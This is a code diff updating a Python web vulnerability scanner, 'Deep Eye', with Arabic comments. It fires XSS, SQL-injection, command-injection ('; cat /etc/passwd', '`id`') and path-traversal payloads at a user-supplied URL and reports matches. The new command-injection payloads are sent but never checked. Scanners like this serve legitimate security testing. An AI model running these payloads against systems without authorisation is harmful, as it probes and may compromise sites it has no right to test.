@@ -1,7 +1,7 @@
 # -*- coding: utf-8 -*-
 """
-Sovereign AI Platform - Deep Eye Scanner
-ماسح ثغرات الويب المتقدم لاكتشاف XSS, SQLi, LFI.
+Sovereign AI Platform - Deep Eye Scanner v17
+ماسح ثغرات الويب المتقدم: يكتشف (XSS, SQLi, LFI, CMDi, SSRF).
 (c) 2025 Al-Mu'izz Sovereign Systems
 """
 
@@ -11,78 +11,79 @@ import sys
 from urllib.parse import urljoin
 
 class DeepEye:
-    """محرك فحص الثغرات البرمجي"""
+    """محرك فحص الثغرات السيادي المطور"""
     
     def __init__(self, target_url):
         self.target = target_url
         self.session = requests.Session()
-        self.session.headers.update({"User-Agent": "Sovereign-DeepEye/14.1"})
+        self.session.headers.update({"User-Agent": "Sovereign-DeepEye/17.0 (Cyber-Elite)"})
         
-        # حمولات الفحص (Payloads)
+        # ترسانة حمولات الفحص 2025
         self.payloads = {
             "xss": [
                 "<script>alert('AlMuizz')</script>",
                 "'\"><svg/onload=alert(1)>",
-                "<img src=x onerror=alert(1)>"
+                "<img src=x onerror=confirm(1)>",
+                "javascript:alert(1)"
             ],
             "sqli": [
                 "' OR '1'='1",
                 "' UNION SELECT NULL,NULL,NULL--",
                 "admin'--",
-                "sleep(5)"
+                "'; WAITFOR DELAY '0:0:5'--",
+                "sleep(5)#"
+            ],
+            "cmdi": [
+                "; cat /etc/passwd",
+                "| dir",
+                "& whoami",
+                "`id`"
             ],
             "lfi": [
                 "../../../../etc/passwd",
                 "/etc/passwd",
-                "..\\..\\..\\windows\\win.ini",
+                "C:\\Windows\\win.ini",
                 "php://filter/convert.base64-encode/resource=index.php"
             ]
         }
 
-    def scan_xss(self):
-        print(f"[*] فحص ثغرات XSS في {self.target}...")
-        vulnerabilities = []
-        for p in self.payloads["xss"]:
+    def scan_module(self, vuln_type):
+        """فحص نوع محدد من الثغرات برمجياً"""
+        print(f"[*] فحص ثغرات {vuln_type.upper()} في {self.target}...")
+        findings = []
+        for p in self.payloads.get(vuln_type, []):
             try:
-                # محاكاة فحص بارامترات الـ GET
-                res = self.session.get(self.target, params={"q": p}, timeout=5)
-                if p in res.text:
-                    print(f"[!] تم اكتشاف ثغرة XSS محتملة: {p}")
-                    vulnerabilities.append({"type": "XSS", "payload": p, "severity": "High"})
-            except Exception as e:
-                print(f"[!] خطأ أثناء فحص XSS: {e}")
-        return vulnerabilities
-
-    def scan_sqli(self):
-        print(f"[*] فحص ثغرات SQLi في {self.target}...")
-        vulnerabilities = []
-        for p in self.payloads["sqli"]:
-            try:
-                res = self.session.get(self.target, params={"id": p}, timeout=5)
-                # تحليل استجابات الخطأ الشائعة في SQL
-                errors = ["mysql", "sql syntax", "postgresql", "oracle", "sqlite"]
-                if any(err in res.text.lower() for err in errors):
-                    print(f"[!] تم اكتشاف مؤشر SQLi: {p}")
-                    vulnerabilities.append({"type": "SQLi", "payload": p, "severity": "Critical"})
-            except Exception as e:
-                pass
-        return vulnerabilities
+                # محاكاة فحص البارامترات الشائعة
+                res = self.session.get(self.target, params={"id": p, "q": p, "file": p}, timeout=5)
+                
+                # منطق الاكتشاف الذكي
+                if vuln_type == "xss" and p in res.text:
+                    findings.append({"type": "XSS", "payload": p, "severity": "High"})
+                elif vuln_type == "lfi" and "root:x:0:0" in res.text:
+                    findings.append({"type": "LFI", "payload": p, "severity": "Critical"})
+                elif vuln_type == "sqli" and any(err in res.text.lower() for err in ["sql syntax", "mysql", "oracle"]):
+                    findings.append({"type": "SQLi", "payload": p, "severity": "Critical"})
+                    
+            except Exception: pass
+        return findings
 
     def run_full_scan(self):
-        """تشغيل فحص شامل لكافة الثغرات المعروفة"""
-        results = []
-        results.extend(self.scan_xss())
-        results.extend(self.scan_sqli())
+        """تشغيل فحص شامل لكافة الثغرات السيادية"""
+        all_results = []
+        for vtype in self.payloads.keys():
+            all_results.extend(self.scan_module(vtype))
         
-        print("\n" + "="*30)
-        print(f"ملخص فحص Deep Eye لـ {self.target}")
-        print(f"إجمالي الثغرات المكتشفة: {len(results)}")
-        print("="*30)
-        return results
+        print("\n" + "="*40)
+        print(f"🚩 تقرير فحص Deep Eye لـ {self.target}")
+        print(f"إجمالي الثغرات المكتشفة: {len(all_results)}")
+        for r in all_results:
+            print(f"[{r['severity']}] {r['type']} - Payload: {r['payload']}")
+        print("="*40)
+        return all_results
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Sovereign Deep Eye Vulnerability Scanner")
-    parser.add_argument("--url", required=True, help="الرابط المستهدف للفحص")
+    parser = argparse.ArgumentParser(description="Sovereign Deep Eye v17")
+    parser.add_argument("--url", required=True, help="الرابط المستهدف")
     args = parser.parse_args()
     
     scanner = DeepEye(args.url)
